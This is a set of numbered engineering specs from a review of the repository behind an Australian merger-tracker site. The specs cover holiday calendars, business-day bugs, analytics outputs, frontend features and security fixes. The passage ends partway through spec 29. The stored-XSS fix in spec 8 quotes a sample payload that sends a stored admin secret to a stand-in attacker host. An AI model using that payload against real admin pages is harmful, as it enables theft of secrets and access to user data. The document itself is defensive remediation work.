# Repo review — implementation specs

Numbered specs from the July 2026 full-repo review. Each spec is written to be
self-contained: an agent picking one up should not need to re-derive the
investigation. Line numbers were correct at the time of writing; treat them as
pointers, not gospel — re-locate by the quoted code if the file has moved on.

Priorities: **P1** = bug or security issue, **P2** = high-value improvement,
**P3** = nice-to-have.

Conventions used throughout:

- "BD" = business day as defined by the ACCC Act: a weekday that is not an ACT
  public holiday and not in the 23 Dec – 10 Jan shutdown. BD 1 of a review
  period is the day **after** the effective notification date (the notification
  date itself is day 0). This is the convention implemented by
  `calculate_business_days` in `scripts/static_data/business_days.py` — but
  **not** by `add_business_days`/`subtract_business_days` in the same file,
  which count their start date as day 1. Several specs below hinge on this
  mismatch; do not "fix" the helpers globally without reading specs 2 and 4.
- After any change to `data/processed/mergers.json` or to business-day logic,
  regenerate the published outputs with `python scripts/generate_static_data.py`
  (run from the repo root) and commit the regenerated files under
  `merger-tracker/frontend/public/data/` and `data/output/` alongside the fix.
- Python tests: `python -m pytest scripts/tests/` from the repo root.
  Frontend tests: `npm test` (vitest) in `merger-tracker/frontend/`.

---

## Part I — Data issues

### 1. Add missing ACT public holiday: Anzac Day observed Monday, 27 April 2026

**Priority:** P1 · **Effort:** small

**Problem.** `merger-tracker/frontend/src/data/act-public-holidays.json` is the
single source of truth for business-day arithmetic in both the Python pipeline
(`scripts/static_data/business_days.py` loads it by path) and the frontend
(`src/utils/dates.js` imports it). Anzac Day 2026 falls on Saturday 25 April.
The ACT observes the following Monday as a public holiday when Anzac Day falls
on a weekend — the file's own 2027 entry (`2027-04-26`, "ANZAC Day (Observed
Monday)", for a Sunday Anzac Day) follows this rule — but the 2026 block has
no substitute entry for Monday 27 April 2026.

**Evidence.** Computing `calculate_business_days(effective_notification_datetime,
end_of_determination_period)` across `data/processed/mergers.json` yields 30
for almost all Phase 1 notifications, except 36 mergers notified mid-March to
late April 2026 (whose 30-BD windows span 27 April) which measure **31**. The
ACCC's own published end dates therefore treat 27 Apr 2026 as a non-business
day; our calendar does not.

**Change.**
- Add `{"date": "2026-04-27", "name": "ANZAC Day (Observed Monday)"}` to the
  2026 `dates` array in `act-public-holidays.json` (keep the array
  date-sorted).
- Sanity-check the remaining years for the same rule: 2028 Anzac Day is a
  Tuesday and 2029 a Wednesday, so no further substitutes are needed; 2025 was
  a Friday. Confirm Christmas/New Year substitutes are irrelevant (they fall
  inside the 23 Dec – 10 Jan shutdown, which is excluded independently).
- Regenerate static data (see conventions) so `stats.json` / `analysis.json`
  durations are recomputed with the corrected calendar.

**Acceptance criteria.**
- Re-running the evidence check shows the 36 mergers now measure 30 BDs
  (verify at least MN-01090: notified 2026-03-12, end 2026-04-28 → 30).
- Frontend unit tests in `src/utils/__tests__/dates.test.js` still pass; add a
  test asserting `isBusinessDay(new Date('2026-04-27'))` is false.
- No Python test regressions.

---

### 2. Fix off-by-one in the `end_of_determination_period` fallback

**Priority:** P1 · **Effort:** small

**Problem.** When the ACCC register page has not yet published an
end-of-determination date, `_calculate_missing_end_of_determination_period`
(`scripts/extract_mergers.py:762-776`) computes it as
`add_business_days(start_dt, 30)`. `add_business_days` counts its start date
as day 1 (when it is a business day), but the project convention — and the
ACCC's — is that BD 1 is the day *after* notification. The fallback therefore
lands on BD 29, one business day early.

**Evidence.** All ACCC-published windows measure 30 BDs via
`calculate_business_days`; exactly two mergers measure 29, both with the
fallback's `T12:00:00Z` signature:
- **MN-30008** (Frasers Group – Accent Group): notified 2026-05-19, stored end
  2026-07-01 — should be 2026-07-02.
- **MN-50030** (Symal Group – Shamrock): notified 2026-07-01, stored end
  2026-08-11 — should be 2026-08-12.

**Change.**
1. In `_calculate_missing_end_of_determination_period`, compute the end as the
   date `d` such that `calculate_business_days(start, d) == 30`. The minimal
   fix: `add_business_days(start_dt + timedelta(days=1), 30)` — but beware the
   `+1 day` may land on a non-business day, which `add_business_days` handles
   correctly (it only counts business days), so this is safe. Add a comment
   explaining the BD-1-is-day-after convention.
2. **Also fix the stored data**: the extractor only computes this field when it
   is absent, so the two wrong values above will persist. Either hand-edit
   `data/processed/mergers.json` for MN-30008 and MN-50030 (and any other
   merger whose stored value measures 29 BDs at fix time — re-run the evidence
   check), or delete the field for those records and re-run extraction so it
   recomputes. Check whether the ACCC page has since published a real value
   before overwriting.
3. Do **not** change `add_business_days` itself — `enrichment.py:137-138` and
   `upcoming_events.py:80-81` rely on its current "start counts as day 1"
   behaviour and are internally consistent (subtracting 90 from the end date
   counting the end as BD 90 yields BD 1; adding 25 counting BD 1 as day 1
   yields BD 25).

**Acceptance criteria.**
- A new unit test (e.g. in `scripts/tests/test_pipeline.py`): given a merger
  with a notification date and no `end_of_determination_period`, the computed
  end satisfies `calculate_business_days(notification, end) == 30`.
- After the data fix + regeneration, no non-waiver merger's stored window
  measures 29 BDs.

---

### 3. Make the median calculation consistent between stats.json and analysis.json

**Priority:** P2 · **Effort:** small

**Problem.** `scripts/static_data/outputs/stats.py:47-50` computes medians as
`sorted(xs)[len(xs) // 2]` — the upper-middle element for even-length lists —
while `scripts/static_data/outputs/analysis.py` uses `statistics.median`,
which averages the two middle values. The Dashboard (fed by stats.json) and
the Analysis page (fed by analysis.json) can therefore display different
"median Phase 1 duration" values for identical data.

**Change.** Use `statistics.median` in `stats.py` for both
`median_duration` and `median_business`. Note the result may now be a float
ending in `.5`; check the Dashboard rendering (`src/pages/Dashboard.jsx`,
"Median phase 1 duration" StatCard) displays such values sensibly — it
currently interpolates the raw value, so either round in the generator to one
decimal place or format on the frontend, but keep stats.json and analysis.json
using the same definition.

**Acceptance criteria.** A unit test with an even-length duration list
asserting stats.py and analysis.py produce the same median; regenerated
stats.json committed.

---

### 4. Fail loudly when the ACT holiday calendar runs out

**Priority:** P2 · **Effort:** small

**Problem.** `act-public-holidays.json` covers 2025–2029. From 2030 (and for
any forward-looking calculation beyond the horizon, e.g. Phase 2 deadlines
computed in late 2029), `is_business_day` silently treats unknown-year
holidays as workdays, quietly skewing every duration and deadline. Spec 1 is
an instance of the general failure mode: nothing checks the calendar.

**Change.**
- **Pipeline:** in `business_days.load_public_holidays()` (or a small check in
  `generate_static_data.py` main), warn to stderr — and exit non-zero in CI —
  if the latest holiday year in the file is less than ~15 months beyond
  today. Fifteen months covers the longest computed horizon (a Phase 2 end of
  determination period ≈ 120 BDs ≈ 6 months, plus slack).
- **Frontend:** add a vitest test that fails when
  `max(year in act-public-holidays.json) < currentYear + 1`. A failing test on
  a January CI run is an acceptable, deliberate tripwire; document it in a
  comment in the test.
- Optionally add a line to `claude.md` noting where the authoritative ACT
  holiday list is published (ACT government website) and the substitute-day
  rules (weekend Anzac Day → following Monday; Christmas-period substitutes
  are moot due to the statutory shutdown).

**Acceptance criteria.** Setting the system date (or injecting a fake "today")
past the horizon makes the pipeline check fail; with the current file and
current date, everything passes.

---

### 5. Surface conditional approvals (`has_conditions` flag)

**Priority:** P2 · **Effort:** medium

**Problem.** `normalize_determination` (`scripts/normalization.py`) maps any
determination string containing "approved" (that isn't "not approved") to the
bare `Approved`. Under the new merger regime the ACCC can approve subject to
conditions; that distinction is lost everywhere downstream (stats, filters,
detail pages). The determination PDFs are already parsed
(`determination_table_content`, `determination_statement_of_reasons` on the
determination event), so the raw signal is available.

**Change.**
1. In the pipeline (suggested location: `enrich_merger` in
   `scripts/static_data/enrichment.py`), derive `has_conditions: true` on a
   merger when the determination is `Approved` and the determination event's
   parsed content indicates conditions — start with case-insensitive matches
   for phrases like "subject to conditions", "s 87B", "section 87B
   undertaking", "conditions of approval" in the raw (pre-normalisation)
   determination string, `determination_table_content`, and the statement of
   reasons. Keep the raw determination string accessible: capture it before
   normalisation (e.g. store `accc_determination_raw` when it differs from the
   normalised value) so future refinements don't need a re-scrape.
2. Propagate the flag into the individual merger JSON, list pages
   (`scripts/static_data/outputs/list.py`), and `stats.json` (a count of
   conditional approvals).
3. Frontend: show a small "with conditions" suffix/badge next to the Approved
   `StatusBadge` when `has_conditions` is set (touch
   `src/components/StatusBadge.jsx` or render alongside it in list/detail).

**Acceptance criteria.** Unit tests for the detection function covering
positive phrases and negatives ("no conditions were imposed" should ideally
not match — acceptable to punt with a documented limitation); at least one
real merger in the dataset flagged or an explicit note in the PR that none
currently qualify; flag visible on detail page when set.

---

### 6. Remove duplicated dict key in upcoming_events.py

**Priority:** P3 · **Effort:** trivial

`scripts/static_data/outputs/upcoming_events.py` — the `consultation_due`
event dict contains `"effective_notification_datetime": notification_date`
twice (lines ~117-118). Delete one. No behaviour change (later key wins);
purely hygiene. Run the test suite.

---

### 7. Replace deprecated `datetime.utcnow()`

**Priority:** P3 · **Effort:** trivial

`scripts/extract_mergers.py:1038` (`auto_fix_missing_event_dates`) uses
`datetime.utcnow()`, deprecated since Python 3.12. Replace with
`datetime.now(timezone.utc)` and strip tzinfo if needed to keep the existing
`strftime` outputs byte-identical (`%Y-%m-%dT12:00:00Z` format). Grep the
whole `scripts/` tree for other `utcnow` occurrences and fix them the same
way. Tests must pass unchanged.

---

## Part II — Security issues

### 8. Fix stored XSS in feedback-admin

**Priority:** P1 · **Effort:** small

**Problem.** `feedback-admin/index.html` renders feedback rows with template
literals injected via `innerHTML`: `<td>${r.message}</td>`,
`<td class="muted">${r.email}</td>`. Messages are public input (anyone can
POST to the site's `/feedback` endpoint after passing Turnstile — Turnstile
proves humanity, not benignity). A message like
`<img src=x onerror=fetch('https://attacker.example/?s='+localStorage.fb_secret)>`
executes when the admin loads the page, and can exfiltrate the worker secret
stored in `localStorage` (`fb_secret`), giving persistent read access to all
feedback including submitter email addresses.

**Change.**
1. Stop interpolating untrusted fields into `innerHTML`. Either build the
   table with `document.createElement` + `textContent`, or add an
   `escapeHtml()` helper (escape `& < > " '`) and wrap **every** interpolated
   field: `r.message`, `r.email`, and also `issueUrl(r)`'s output when placed
   in the `href` attribute (URLSearchParams already percent-encodes the
   values, but the composed URL still lands in an attribute — escape it).
2. Defence in depth: add
   `<meta http-equiv="Content-Security-Policy" content="default-src 'self'; connect-src *; style-src 'unsafe-inline'">`
   — adjust so the page still works (inline `<style>` and `<script>` blocks:
   either allow with hashes or accept `'unsafe-inline'` for styles only and
   move the script to a separate file if the tool is served over HTTP;
   if it stays a local file, the escaping fix is the load-bearing part).

**Acceptance criteria.** Submitting (or hand-inserting into D1) a feedback row
containing `<img src=x onerror=alert(1)>` renders as literal text in the admin
table; the "New issue" link still opens a correctly pre-filled GitHub issue.

---

### 9. Harden the `is_safe_url` domain check

**Priority:** P1 (low exploitability) · **Effort:** trivial

**Problem.** `scripts/extract_mergers.py:122-126` allows attachment downloads
when `parsed.netloc.endswith('accc.gov.au')`. This also matches
`evilaccc.gov.au` (no dot boundary). Exploitation requires a crafted link on
an ACCC register page, so risk is low, but the fix is one line.

**Change.** Use `parsed.hostname` (not `netloc`, which can carry
`user:pass@` and `:port`) and require
`hostname == 'accc.gov.au' or hostname.endswith('.accc.gov.au')`. Handle
`hostname is None`. Grep the repo for other `endswith(...gov.au'` /
domain-allowlist patterns and apply the same boundary rule.

**Acceptance criteria.** Unit tests: `https://www.accc.gov.au/x` allowed;
`https://accc.gov.au/x` allowed; `https://evilaccc.gov.au/x`,
`https://accc.gov.au.evil.com/x`, `ftp://accc.gov.au/x`, and a URL with no
host all rejected.

---

### 10. Enforce a sender allowlist on the register watcher

**Priority:** P2 · **Effort:** small

**Problem.** `accc-register-watcher/src/index.js` treats a blank
`ALLOWED_SENDERS` var as "accept any sender", and From headers are spoofable.
Worst case is an attacker triggering pipeline runs by emailing the watcher
address (cost/noise; the `pipeline-main` concurrency group bounds the damage).

**Change.**
- Flip the default: when `ALLOWED_SENDERS` is blank/unset, **reject** and log,
  instead of accepting. Update the wrangler.toml comment and
  `accc-register-watcher/README.md` accordingly, including the recommended
  value (the ACCC mailing-list sender domain, e.g. `@accc.gov.au` plus the
  actual bulk-mail sender observed in practice — check the received emails).
- Optional hardening, note in README: Cloudflare Email Routing exposes SPF/DKIM
  verdicts on the message; if accessible from the Worker runtime, reject
  messages that fail authentication.

**Acceptance criteria.** With the env var unset, an email produces a warn log
and no dispatch; with a configured allowlist, matching senders dispatch as
before. Update or add any tests the package has (it currently has none — a
small unit test around `isAllowedSender` covering the new default is enough).

---

### 11. Add rate limiting to the signup/feedback Worker

**Priority:** P2 · **Effort:** small-medium

**Problem.** `cloudflare-worker/src/index.js` (POST `/` signup, POST
`/feedback`) has no rate limiting. Turnstile throttles bots, but a patient
human or a token-solving service can spam D1 feedback rows or Resend audience
contacts.

**Change.** Two acceptable implementations — pick one and document it in the
worker README:
1. **Dashboard-level** (preferred, zero code): a Cloudflare WAF rate-limiting
   rule on `signup.mergers.fyi` (e.g. 5 POSTs per 10 minutes per IP). Since
   this is configured outside the repo, add the exact rule spec to
   `cloudflare-worker/README.md` so it can be recreated.
2. **In-worker**: a fixed-window counter keyed on `CF-Connecting-IP` using a
   KV namespace or the Workers Rate Limiting API binding
   (`unsafe.bindings` / `ratelimit` binding in wrangler.toml), returning 429
   with a friendly JSON error consistent with existing error shapes.

Also cap feedback inserts per IP per day (e.g. 20) if implementing in-worker.

**Acceptance criteria.** Burst-POSTing past the limit yields 429 (or the WAF
rule spec is committed to the README with screenshots/values); normal
single-submission flow unaffected; frontend `FeedbackPopup`/`Digest` signup
surfaces the 429 message gracefully (verify the error path renders).

---

## Part III — Automated analysis (new pipeline outputs)

Shared plumbing note: new aggregate outputs belong in
`scripts/static_data/outputs/` (one module per file, `generate(mergers) ->
dict` like `stats.py`), wired into `generate_static_data.py`'s
`single_file_outputs` list, with the JSON consumed by a frontend page/section.
Add tests mirroring `scripts/tests/test_static_data_outputs.py`.

### 12. Serial-acquirer detection ("creeping acquisitions")

**Priority:** P2 · **Effort:** medium

**What.** Flag acquirers with multiple notifications in the same industry
within a rolling window — the pattern the new regime's cumulative-turnover
thresholds target. Inputs all exist: canonical party groups
(`data/processed/related_parties.json`, matching helpers in
`scripts/party_matching.py`), ANZSIC codes per merger, notification dates.

**Spec.**
- For each canonical acquirer group (fall back to normalised acquirer name
  when no group exists — reuse `party_matching.normalize` rather than
  inventing a new normaliser), collect its notifications (non-waiver mergers
  where it appears in `acquirers`).
- Emit a record per (acquirer, ANZSIC **class or group level**) with ≥2
  notifications where at least two fall within any 12-month window:
  `{acquirer_name, canonical_id, anzsic_code, anzsic_name, merger_ids:[...],
  dates:[...], count}`. Roll ANZSIC tagging up via
  `scripts/static_data/anzsic.py` ancestors so a class-tagged and
  group-tagged filing by the same acquirer still pair.
- Output `serial-acquirers.json` (sorted by count desc, then most recent
  date). Frontend consumption is spec 23/Part IV territory; for this spec a
  data-only PR is fine, but include the JSON in the deployed `public/data/`
  so the frontend can adopt it.

**Acceptance criteria.** Unit test with a synthetic fixture (same canonical
acquirer, two mergers, same ANZSIC class, 6 months apart → detected; 18
months apart → not, unless a third filing bridges the windows). Run against
real data and eyeball the top entries for sanity (no obviously-different
companies merged by overzealous name matching).

### 13. Deadline-utilisation statistics

**Priority:** P2 · **Effort:** small

**What.** How much of its statutory clock does the ACCC use? For every
completed Phase 1 (non-waiver, `phase_1_determination` set, not referred),
compute `used_bd = calculate_business_days(notification, phase_1_determination_date)`
and, where `end_of_determination_period` exists,
`slack_bd = calculate_business_days(phase_1_determination_date, end_of_determination_period)`.

**Spec.** Add to `analysis.json` a `deadline_utilisation` block: histogram of
`used_bd` (buckets 1–30+), counts of decisions landing on each of the last 5
BDs before the deadline, and summary stats (mean/median used, % decided in the
final 3 BDs). Exclude extended matters (windows measuring >31 BDs) from the
"% of 30-day clock" framing but report them separately as
`extended_count`. Frontend rendering is optional here (see spec 22 for the
chart it feeds).

**Acceptance criteria.** Unit test with synthetic mergers; regenerated
analysis.json contains plausible values (spot-check one merger by hand).

### 14. Clock-restart analysis

**Priority:** P2 · **Effort:** small

**What.** `original_notification_datetime` vs `effective_notification_datetime`
already captures restarted/amended notifications, but nothing analyses it.

**Spec.** Add to `analysis.json`: `notification_restarts` = list of
`{merger_id, merger_name, original_date, effective_date, delta_calendar_days}`
for every merger where the two dates differ, plus `restart_rate` (restarted /
total notifications). Sort by delta desc.

**Acceptance criteria.** Unit test; verify against real data (there are known
restarts — if the list comes back empty, investigate rather than ship).

### 15. Outcome mix and Phase 2 referral rate over time and by industry

**Priority:** P2 · **Effort:** medium

**What.** Sibling of the existing `industry_phase1_duration`: outcomes, not
durations.

**Spec.** Two additions to `analysis.json`:
- `outcomes_by_division`: per ANZSIC division (reuse `_division_for_code` from
  `analysis.py`), counts of approved / not approved / referred-to-Phase-2 /
  in-progress, and `phase2_referral_rate` (referred ÷ completed+referred).
  Attribute a merger to every division its codes roll up to, deduped, exactly
  as `industry_phase1_duration` does.
- `referrals_by_quarter`: per calendar quarter of notification, count of
  notifications and count subsequently referred to Phase 2 (use
  `phase_1_determination == 'Referred to phase 2'`).

**Acceptance criteria.** Unit tests with fixtures covering the dedup and
rollup paths; totals reconcile with `stats.json` `by_determination`.

### 16. Theory-of-harm taxonomy from Phase 2 notices and NOCCs

**Priority:** P3 · **Effort:** medium

**What.** `phase2_notice_matters_to_investigate` (list of text boxes per
Phase 2 notice event) and NOCC section text (`data/processed/nocc_data.json`)
are parsed but never aggregated.

**Spec.** A keyword-based classifier (documented, easily extended) mapping
each "matter to investigate" to zero or more categories: horizontal unilateral
effects, coordinated effects, vertical foreclosure, conglomerate/bundling,
potential/nascent competition, buyer power, entry barriers. Emit
`theories_of_harm.json`: per-category counts with contributing
`{merger_id, excerpt}` records. Keep the raw matched phrase so
misclassifications are auditable. This is a small dataset (Phase 2 matters
are rare) — precision matters more than recall; unmatched matters go into an
`unclassified` bucket rather than being force-fitted.

**Acceptance criteria.** Unit tests per category with real excerpts from the
existing data; every current Phase 2 matter appears in the output exactly once
per matter-to-investigate entry.

### 17. Commission-division analytics

**Priority:** P3 · **Effort:** small

**What.** `determination_commission_division` is parsed from every
determination PDF but appears in no aggregate output.

**Spec.** Add `by_commission_division` to `analysis.json`: per division
(normalise whitespace/case; treat missing as "Unknown"), count of
determinations, outcome mix, and median Phase 1 business days (reuse
`collect_phase_1_durations` on the subset). Fold into the Analysis page later;
data-only is acceptable for this spec.

**Acceptance criteria.** Unit test; division labels in output match the raw
strings' canonical forms (document the normalisation choices in the module
docstring).

### 18. Semantic search over determinations (embeddings Stage 2)

**Priority:** P3 · **Effort:** large

**What.** `scripts/embed.py` already produces `data/embeddings.json`
(metadata, one record/line) and `data/embeddings.bin` (packed float32,
256-dim, ~608 KB) — explicitly "Stage 1 only". Build the consumer.

**Spec.**
- Publish both files under `merger-tracker/frontend/public/data/` (add to the
  embed workflow's commit step; keep the repo-root copies as the source).
- New route `/search` (lazy-loaded — do not add the model or the bin file to
  the main bundle): fetch `embeddings.bin` as an ArrayBuffer + the JSON
  metadata on first use; embed the user's query **in-browser** with
  transformers.js running the same model family — note EmbeddingGemma is
  gated, so either (a) use the ONNX build if it can be self-hosted within the
  site's CSP (`script-src`/`connect-src 'self'` — model weights must be served
  from the same origin, mind repo size: prefer Cloudflare R2 or a separate
  asset host and extend CSP `connect-src` explicitly), or (b) switch
  `embed.py`'s `MODEL_NAME` to an ungated small model (e.g. all-MiniLM-L6-v2,
  384-dim — the constant and dim are designed to be swappable and the hash
  scheme invalidates caches automatically) and re-embed. Option (b) is the
  pragmatic path; take it unless there's a strong quality reason not to.
- Ranking: cosine similarity (vectors are normalised — dot product) over all
  rows, group hits by `merger_id`, show best-section snippet label
  ("matched: reasons"), link to the merger page.
- Degrade gracefully: if WebGPU/WASM model load fails, fall back to the
  existing substring search with a notice.

**Acceptance criteria.** Query "petrol stations" surfaces fuel-retail matters
ahead of unrelated ones; page works offline-from-CDN-failures (fallback
path); Lighthouse perf on `/` unaffected (nothing new loaded eagerly).

---

## Part IV — Frontend presentation

### 19. "BD X of 30" progress indicator for matters under assessment

**Priority:** P2 · **Effort:** small

**What.** List cards and the detail page show the end-of-determination *date*;
practitioners think in "day 22 of 30".

**Spec.** For non-waiver mergers with status `Under assessment` and both
`effective_notification_datetime` and `end_of_determination_period`:
- Compute `elapsed = calculateBusinessDays(notification, today)` and
  `total = calculateBusinessDays(notification, end_of_determination_period)`
  (do **not** hardcode 30 — extensions and Phase 2 make totals vary; Phase 2
  matters will naturally show e.g. "BD 47 of 120").
- Detail page (`MergerDetail.jsx`): a slim progress bar + "Business day X of
  Y" in the header/status area. List cards (`Mergers.jsx`): a compact
  "BD X/Y" text chip next to the end-of-determination date; skip the bar on
  cards to avoid clutter.
- Clamp at Y (never show "BD 32 of 30"); when past the end date show
  "Determination overdue" styling instead.
- Reuse `calculateBusinessDays` from `src/utils/dates.js`; land spec 1 first
  so the numbers are right.

**Acceptance criteria.** Component test with fixed "today" (vitest fake
timers) covering mid-period, day-0 (notified today → BD 0), and overdue; no
indicator on waivers or completed matters.

### 20. Phase 2 tracker page

**Priority:** P2 · **Effort:** medium-large

**What.** Only ~6 matters are in Phase 2 at any time. A dedicated view with
statutory milestones would be a signature feature; all milestone inputs are
already computed (`competition_concerns_notice_date`,
`end_of_determination_period`, referral event date, `phase_2_inferred`).

**Spec.**
- Pipeline: new output `phase2.json` — for every merger whose stage contains
  Phase 2 (current) plus completed Phase 2 matters (historical section): id,
  name, referral date (the `is_phase_2_referral_event` event's date), NOCC
  due/issued (issued = the "competition concern" event if present, else the
  computed due date), end of determination period, determination + date,
  `phase_2_inferred`.
- Frontend: route `/phase-2` (add to Navbar). Current matters as horizontal
  timeline bars from referral → deadline with today-marker and milestone ticks
  (NOCC due/issued, determination due); a table of completed Phase 2 matters
  with duration and outcome underneath. Use existing Chart.js or plain
  flex/CSS bars — CSS bars are simpler and match the existing
  `UpcomingEventsTimeline` aesthetic.
- Mark inferred-Phase-2 matters with the existing inferred styling/badge
  language used elsewhere ("inferred from Phase 2 notice").

**Acceptance criteria.** Page renders the ~6 live matters with correct dates
(cross-check one against its merger detail page); mobile layout does not
overflow horizontally; route added to sitemap generator
(`scripts/generate_sitemap.py` static-routes list) and SEO component used.

### 21. iCal feed of upcoming events

**Priority:** P2 · **Effort:** small

**What.** Lawyers live in Outlook. Serve the existing upcoming-events data as
a subscribable calendar.

**Spec.**
- New generator (suggested: `scripts/generate_ical.py`, called from the
  pipeline where `generate_rss_feed.py` runs) reading the same enriched data
  as `upcoming_events.generate` (or simply consuming the generated
  `upcoming-events.json`) and writing
  `merger-tracker/frontend/public/events.ics`.
- One VEVENT per event: all-day events (`DTSTART;VALUE=DATE`), UID
  `{merger_id}-{type}@mergers.fyi` (stable across regenerations so calendar
  clients update rather than duplicate), SUMMARY like
  "Consultation due: {merger_name}", DESCRIPTION with the event type and URL
  `https://mergers.fyi/mergers/{id}`, and `URL` property. Fold long lines at
  75 octets and escape `, ; \n` per RFC 5545 — write a tiny escaping helper
  with unit tests; merger names contain commas and slashes.
- Include `X-WR-CALNAME:ACCC merger deadlines` and a `REFRESH-INTERVAL`/
  `X-PUBLISHED-TTL` of 1 day.
- Frontend: add a "Subscribe (iCal)" link wherever upcoming events are shown
  (Dashboard section header and/or Footer), pointing at `/events.ics`.

**Acceptance criteria.** Generated file validates (use a validator lib or the
icalendar package in a test to round-trip parse); importing into Google
Calendar shows the events on the right days; regeneration with unchanged data
is byte-identical (no timestamp churn — omit DTSTAMP or pin it to the event
date) so git diffs stay meaningful.

### 22. ECDF / survival curve of Phase 1 durations on the Analysis page

**Priority:** P3 · **Effort:** small

**What.** A cumulative view generalising the existing day-15/20/30 table:
"X% of Phase 1 reviews conclude by BD N".

**Spec.** The per-merger business-day durations already ship in
`analysis.json` `phase1_duration.scatter_data` (completed matters:
`in_progress === false`), so this can be **frontend-only**: compute the ECDF
in the component, render as a stepped line chart (Chart.js `stepped: true`)
with vertical reference line at BD 30 and dashed markers at the median.
Tooltip: "by BD {x}: {y}% ({n} of {total})". Place below the existing
"Phase 1 duration over time" scatter in `Analysis.jsx`. If spec 13 lands, its
histogram can share a section, but do not block on it.

**Acceptance criteria.** Component test with a fixture asserting the ECDF
points; chart respects the existing responsive/accessibility patterns (sr-only
table fallback like Dashboard's charts).

### 23. Canonical party pages

**Priority:** P3 · **Effort:** medium

**What.** Canonical party groups power search and party links today; give each
group a page ("Wesfarmers — 6 notifications, 1 Phase 2, median 24 BDs").

**Spec.**
- Pipeline: new output `parties/{group_id}.json` + `parties.json` index, built
  from `related_parties.json` groups and — decide and document — whether
  single-appearance parties get pages (recommend: no; groups only, to bound
  page count). Per group: canonical name, member names/identifiers, mergers by
  role (acquirer/target/other) with dates and outcomes, summary stats.
- Frontend: route `/parties/:id` (+ index page or just deep links), linked
  from the existing canonical-party chips on `MergerDetail.jsx` (which
  currently link to a filtered mergers list — keep that as secondary). Add to
  sitemap.
- SEO: these pages are the long-tail entry points; use the merger-count in the
  meta description.

**Acceptance criteria.** Every `canonical` link on a merger detail page
resolves to a party page listing that merger; sitemap includes party URLs;
pipeline output deterministic (sorted).

### 24. Per-merger OG images

**Priority:** P3 · **Effort:** medium

**What.** The bot-serving Pages Function (`functions/mergers/[matter]/[[path]].js`)
already returns per-merger OG *text*; every share still shows the generic
`og-image.png`.

**Spec.**
- Generate a per-merger card image at pipeline time (simplest and CSP-free):
  a small Python step (Pillow, or SVG template → PNG via a build step) writing
  `merger-tracker/frontend/public/og/{merger_id}.png` (1200×630): merger name
  (wrapped, capped), status/determination badge colour-coded with the site
  palette (`#335145` primary), notification date, "mergers.fyi" wordmark. Only
  generate for mergers changed in this run (compare mtimes/content hash) to
  keep pipeline time and repo churn down; note repo-size tradeoff — if the
  image set exceeds a few MB, switch to generating only for active +
  recently-determined matters and fall back to the generic image otherwise.
- Update `buildOgHtml` to point `og:image`/`twitter:image` at
  `/og/{matterId}.png` when the file exists (the function can't cheaply stat —
  either always reference it and generate for all mergers, or include an
  `og_image: true` flag in the merger JSON the function already fetches).
- Also update the SPA's `SEO.jsx` merger-detail usage if it sets og:image.

**Acceptance criteria.** Sharing a merger URL into Slack/Twitter card
validators shows the per-merger card; mergers without a generated image fall
back to the generic one; pipeline run time increase is trivial on no-change
runs.

---

## Part V — Frontend UX / redesign

### 25. Stop search/filter changes spamming browser history

**Priority:** P1 (UX bug) · **Effort:** trivial

**Problem.** `Mergers.jsx` `updateParam` (line ~165) calls
`setSearchParams(params)` — default **push** — on every keystroke of the
search box, so typing "ampol" creates 5 history entries and Back walks the
query letter by letter.

**Spec.** Pass `{ replace: true }` for continuous inputs: the search box
(both the onChange and the clear button) and reasonably also selects/toggles.
Check `Timeline.jsx`, `Industries.jsx`, `IndustryDetail.jsx` for the same
pattern and fix consistently. Preserve pushes only where a discrete
"navigation" is intended (none identified). Verify the existing
back/forward-sync effect (`setSearchTerm(searchParams.get('q') || '')`) still
restores state when navigating back from a merger detail page.

**Acceptance criteria.** Type a 6-char query, click a merger, press Back once
→ returns to the fully-typed query; press Back again → leaves the mergers
page.

### 26. Multi-term (token AND) search matching

**Priority:** P2 · **Effort:** small

**Problem.** `searchMergers` (`src/utils/searchIndex.js:108-118`) does one
`.includes(term)` on the whole query, so "google wiz" fails to match a merger
whose index contains "google … wiz" non-adjacently.

**Spec.** Split the query on whitespace into tokens; a merger matches when
**every** token is a substring of its index string. Keep single-token
behaviour identical. Update the JSDoc examples. Consider (optional, cheap)
treating quoted phrases as single tokens; skip fuzzy matching.

**Acceptance criteria.** Unit tests in `searchIndex.test.js`: "google wiz"
matches a fixture with both words apart; "google amazon" matches nothing;
empty/whitespace query returns all; existing tests pass.

### 27. Render the first page of the mergers list immediately

**Priority:** P2 · **Effort:** small-medium

**Problem.** `Mergers.jsx` `fetchMergers` awaits meta + all ~9 list pages
(batched 4-wide) before rendering anything on a cold visit.

**Spec.** Fetch meta + page 1, render immediately (list shows, search box
enabled but annotated), continue fetching remaining pages in the background,
appending to state and rebuilding the search index once at the end (or
incrementally — but ensure `clearSearchIndex()` semantics stay correct so a
stale partial index is never cached as complete: only write the
`mergers-list` dataCache entry and the search-index cache after **all** pages
arrive; before that, keep partial data in component state only).
While background pages are loading, show a subtle "Loading all mergers…
(N of M pages)" indicator and make search/filter operate on what's loaded.
Keyboard nav and infinite scroll must not jump when new data arrives sorted —
apply the default sort on append.

**Acceptance criteria.** Throttled-network test (devtools "Slow 3G"): first
cards visible after ~2 round trips instead of ~4; after load completes,
result counts identical to current behaviour; navigating away mid-load and
back does not produce a permanently truncated cached list.

### 28. ⌘K command palette

**Priority:** P3 · **Effort:** medium

**What.** Unify merger search + navigation in a modal palette; keyboard
infrastructure already exists (`useKeyboardShortcuts.js`,
`KeyboardShortcutsHelp.jsx`).

**Spec.**
- Global shortcut ⌘K/Ctrl-K (and `/` when not in an input) opens a modal with
  a single input; results in two groups: **Pages** (Dashboard, Mergers,
  Timeline, Industries, Analysis, Commentary, Digest — static list) and
  **Mergers** (top ~8 matches via the existing `buildSearchIndex`/
  `searchMergers` over the cached `mergers-list`; if not yet cached, fetch
  list pages lazily on first open and show a loading row).
- Arrow keys + Enter to navigate, Esc closes, click-outside closes; focus
  trap; restore focus on close; `role="dialog"` + listbox semantics.
- Register the shortcut in `KeyboardShortcutsHelp`.
- No new dependencies — hand-rolled modal consistent with Tailwind styles.

**Acceptance criteria.** Component tests for open/close/keyboard selection;
opening on a cold visit (no cache) still returns results; no scroll-behind
while open.

### 29. Dark mode

**Priority:** P3 · **Effort:** large (mechanical)

**Spec.**
- Tailwind `darkMode: 'class'`; toggle in Navbar (sun/moon), persisted in
  `localStorage`, default from `prefers-color-scheme`; set the class on
  `<html>` in an inline script in `index.html` **before** paint to avoid
  flash (the CSP allows 'unsafe-inline' scripts, so this works — keep it
  tiny).
- Sweep components adding `dark:` variants; define dark equivalents for the
  card/border/shadow idioms in one place (extend `cardStyles.js` /
